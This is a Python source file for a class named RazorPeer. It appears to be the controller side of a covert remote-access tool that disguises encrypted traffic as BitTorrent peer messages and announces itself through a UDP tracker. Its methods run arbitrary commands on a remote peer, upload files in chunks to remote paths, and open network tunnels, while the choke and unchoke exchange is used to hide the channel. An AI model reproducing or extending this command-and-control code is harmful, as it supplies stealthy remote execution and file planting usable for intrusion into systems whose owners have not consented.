from razor.proto_client import BaseRazorPeer
from razor.payload import RunCommand, BLOCK_SIZE, UploadFile
from razor.encryptor import AESCipher
import os
import tqdm
from razor.tunneler import RazorTunneler
from razor.udp_tracker import UDPTrackerAnnouncer


class RazorPeer(BaseRazorPeer):

    def __init__(self, info_hash, enc_key, tracker_address):
        super(RazorPeer, self).__init__(info_hash)
        self.enc_key = enc_key
        self.enc = None
        self.tracker_ip = tracker_address[0]
        self.tracker_port = tracker_address[1]

    def initiate_session(self):
        self.bitfield_handshake()
        self.enc = AESCipher(self.enc_key, self.nonce)

    def _reject_last_request(self):
        msg = self.read_message()
        self.reject_request(msg)

    def _wait_for_unchoke(self):
        msg = self.read_message()

    def _initiate_sending(self):
        self.unchoke()

    def send_buffer(self, buf):
        buf = self.enc.encrypt(buf)
        self.send_sequence(buf)

    def send_receive(self, buf):
        self._initiate_sending()
        self._logger.debug("Sending buffer")
        self.send_buffer(buf)
        self._logger.debug("Waiting for session reverse")
        self._wait_for_unchoke()
        self._finalize_sending()
        self._logger.debug("Receiving buffer")
        return self.read_buffer()

    def _finalize_sending(self):
        self.choke()
        self._reject_last_request()

    def read_buffer(self):
        buf = self.receive_output(self.enc)
        return buf

    def exec(self, executable, params=""):
        payload = RunCommand(executable, params).to_razor_payload()
        self._logger.info(f"Running remote command {executable} {params}")
        cmd_out = self.send_receive(payload)
        return cmd_out.decode('utf-8')

    def upload_file(self, local_path, remote_path):
        chunk_size = int((BLOCK_SIZE - 24) / 2.5)
        chunk_count = int(os.path.getsize(local_path) / chunk_size) + 1
        self._initiate_sending()
        with open(local_path, 'rb') as local_file:
            for i in tqdm.tqdm(range(chunk_count), unit="Chunks"):
                chunk = local_file.read(chunk_size)
                payload = UploadFile(remote_path, chunk, append=bool(i)).to_razor_payload()
                self.send_buffer(payload)
        self._finalize_sending()

    def start_tunnel(self, ip, port):
        return RazorTunneler(ip, port, self)

    def listen(self, address, timeout=1000):
        with UDPTrackerAnnouncer(self.tracker_ip, self.tracker_port, self.info_hash, self.peer_id, address[1]):
            super(RazorPeer, self).listen(address, timeout)
        self.initiate_session()
